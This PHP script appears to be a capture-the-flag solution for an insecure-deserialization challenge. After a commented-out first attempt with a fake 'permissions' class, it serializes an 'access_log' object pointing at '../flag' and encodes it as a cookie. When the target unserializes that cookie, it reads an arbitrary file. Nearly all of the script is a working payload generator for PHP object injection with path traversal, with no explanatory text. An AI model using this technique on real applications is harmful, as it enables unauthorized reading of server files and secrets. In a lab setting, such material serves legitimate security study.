<?php 

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return "please work";
	}
    function is_admin(){
        throw new Error();
    }
}

// $perm_res = new permissions('admin','admin2');
// echo serialize($perm_res);
// echo "\n";
// $cookie_res = urlencode(base64_encode(serialize($perm_res)));
// echo $cookie_res;
// echo "\n";
// $perm = unserialize(base64_decode(urldecode($cookie_res)));
// $g = $perm->is_guest();
// $a = $perm->is_admin();
// echo "\n";
// echo $g." ".$a;


// --- try 2


class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

$obj = new access_log('../flag');
$enc = urlencode(base64_encode(serialize($obj)));
echo $enc;
echo "\n";
?>